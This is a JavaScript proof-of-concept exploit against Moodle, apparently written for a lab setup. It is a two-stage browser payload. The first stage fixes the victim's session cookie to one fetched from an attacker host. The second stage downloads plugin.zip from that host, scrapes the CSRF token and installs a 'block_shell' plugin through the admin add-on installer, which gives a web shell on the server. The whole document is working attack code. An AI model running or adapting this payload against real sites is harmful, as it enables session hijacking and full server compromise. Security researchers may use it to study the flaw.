// Target site, without a trailing slash
let moodleRoot = "http://moodle.lab.local";

// Attacker site without a trailing slash
let attackerRoot = "http://attacker.lab.local";

// Use the "poisoned" cookie to tell if the first stage has been completed
if (!document.cookie.includes("poisoned")) { // First stage
    let callback = function() {
        let attackerCookie = this.responseText;
        document.cookie = "MoodleSession=" + attackerCookie + "; path=/my/; expires=Thu, 31 Dec 2020 01:00:00 UTC;";
        document.cookie = "poisoned=1; path=/my/; expires=Thu, 31 Dec 2020 01:00:00 UTC;";
        
        // Have to logout now as can't clear cookie
        let logoutURL = document.querySelector("a[data-title='logout,moodle']").href;
        document.location.replace(logoutURL);
    };

    // Send off for attacker's cookie
    let req = new XMLHttpRequest();
    req.addEventListener("load", callback);
    req.open("GET", `${attackerRoot}/cookie.php`);
    req.send();

} else { // Second stage
    var csrftoken = "";
    var formData = new FormData();
    var pluginFile;

    // Confirm, which gives shell
    let confirmPlugin = function () {
        let pattern = /name="installzipstorage" value="([^"]*)"/;
        let guid = pattern.exec(this.responseText)[1];
        let postData = `installzipcomponent=block_shell&installzipstorage=${guid}&installzipconfirm=1&sesskey=${csrftoken}`;
        let req = new XMLHttpRequest();
        req.open("POST", `${moodleRoot}/admin/tool/installaddon/index.php`);
        req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        req.send(postData);
    };

    // Actually install the plugin
    let installPlugin = function() {
        let fileid = /"id":([0-9]+),/.exec(this.responseText)[1];

        let postData = `sesskey=${csrftoken}&_qf__tool_installaddon_installfromzip_form=1&mform_showmore_id_general=0&mform_isexpanded_id_general=1&zipfile=${fileid}&plugintype=&rootdir=&submitbutton=Install+plugin+from+the+ZIP+file`;
        let req = new XMLHttpRequest();
        req.addEventListener("load", confirmPlugin);
        req.open("POST", `${moodleRoot}/admin/tool/installaddon/index.php`);
        req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        req.send(postData);
    };

    // Craft the upload form
    let getFormData = function() {
        //pluginFile = new Blob([pluginContent], {type: "application/zip"});
        formData.append("repo_upload_file", pluginFile, `shell-${Date.now().toString()}.zip`); // This filename must be unique for future parsing
        formData.append("client_id", /"client_id":"([^"]*)"/.exec(this.responseText)[1]);
        formData.append("itemid", /"itemid":([^"]*),/.exec(this.responseText)[1]);
        csrftoken = /"sesskey":"([^"]*)"/.exec(this.responseText)[1];
        formData.append("sesskey", csrftoken);
        formData.append("title", "");
        formData.append("author", "Trustworthy person");
        formData.append("license", "allrightsreserved");
        formData.append("accepted_types[]", ".zip");
        formData.append("repo_id", "4");
        formData.append("page", "");
        formData.append("p", "");
        formData.append("env", "filepicker");
        formData.append("maxbytes", "-1");
        formData.append("areamaxbytes", "-1");
        formData.append("ctx_id", "1");
        formData.append("savepath", "/");
        
        let req = new XMLHttpRequest();
        req.open("POST", `${moodleRoot}/repository/repository_ajax.php?action=upload`);
        req.addEventListener("load", installPlugin);
        req.send(formData);
    };

    // Get contents of plugin from attacker's server
    let pluginCallback = function() {
        pluginFile = this.response;

        let req =  new XMLHttpRequest();
        req.addEventListener("load", getFormData);
        req.open("GET", `${moodleRoot}/admin/tool/installaddon/index.php`);
        req.send();
    };

    // Get plugin
    let req = new XMLHttpRequest();
    req.addEventListener("load", pluginCallback);
    req.responseType = "blob";
    req.open("GET", `${attackerRoot}/plugin.zip`);
    req.send();


	// Make retesting easier, though removes persistence
	document.cookie = "poisoned=; expires=Thu, 01 Jan 1970 00:00:00 UTC;";
	document.cookie = "MoodleSession=; path=/my/; expires=Thu, 01 Jan 1970 00:00:00 UTC;";
}
